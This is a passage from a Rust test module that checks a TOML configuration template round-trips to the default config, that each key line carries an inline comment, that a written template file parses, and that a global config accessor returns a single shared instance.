    fn template_roundtrips_to_default() {
        let rendered = template_toml();
        let parsed: Config = toml::from_str(&rendered).expect("template parses");
        assert_eq!(parsed, Config::default());
        // Every key carries an inline comment.
        for line in rendered.lines() {
            let t = line.trim();
            if !t.is_empty() && !t.starts_with('#') && !t.starts_with('[') {
                assert!(t.contains('#'), "key line missing comment: {}", t);
            }
        }
    }

    #[test]
    fn write_template_produces_parseable_file() {
        let dir = tempfile::tempdir().expect("temp dir");
        let path = dir.path().join("config.example.toml");
        write_template(&path).expect("write template");
        let c = load_from_file(&path).expect("written template parses");
        assert_eq!(c, Config::default());
    }

    #[test]
    fn global_accessor_returns_same_instance() {
        let a = config() as *const Config;
        let b = config() as *const Config;
        assert_eq!(a, b);
    }
}